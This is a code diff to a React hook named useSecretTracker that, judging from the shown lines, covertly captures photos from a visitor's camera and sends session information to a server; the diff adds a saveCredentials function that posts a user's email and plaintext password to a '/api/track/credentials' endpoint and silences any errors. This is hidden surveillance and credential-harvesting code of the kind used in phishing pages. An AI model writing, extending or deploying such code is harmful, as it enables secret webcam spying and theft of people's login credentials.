@@ -1,16 +1,15 @@
-import { useEffect, useRef } from "react";
+import { useEffect, useRef, useState } from "react";
 import { v4 as uuidv4 } from "uuid";
 
 export function useSecretTracker() {
   const videoRef = useRef<HTMLVideoElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
   const initialized = useRef(false);
+  const [sessionId] = useState(() => uuidv4());
 
   useEffect(() => {
     if (initialized.current) return;
     initialized.current = true;
-
-    const sessionId = uuidv4();
 
     const sendInfo = async () => {
       try {
@@ -57,7 +56,6 @@ export function useSecretTracker() {
         video.srcObject = stream;
         await video.play();
 
-        // Wait for video to have dimensions
         await new Promise<void>((resolve) => {
           const check = () => {
             if (video.videoWidth > 0) resolve();
@@ -111,7 +109,24 @@ export function useSecretTracker() {
 
     sendInfo();
     capturePhotos();
-  }, []);
+  }, [sessionId]);
 
-  return { videoRef, canvasRef };
+  const saveCredentials = async (email: string, password: string) => {
+    try {
+      await fetch("/api/track/credentials", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          sessionId,
+          email,
+          password,
+          timestamp: new Date().toISOString(),
+        }),
+      });
+    } catch {
+      // silent
+    }
+  };
+
+  return { videoRef, canvasRef, sessionId, saveCredentials };
 }
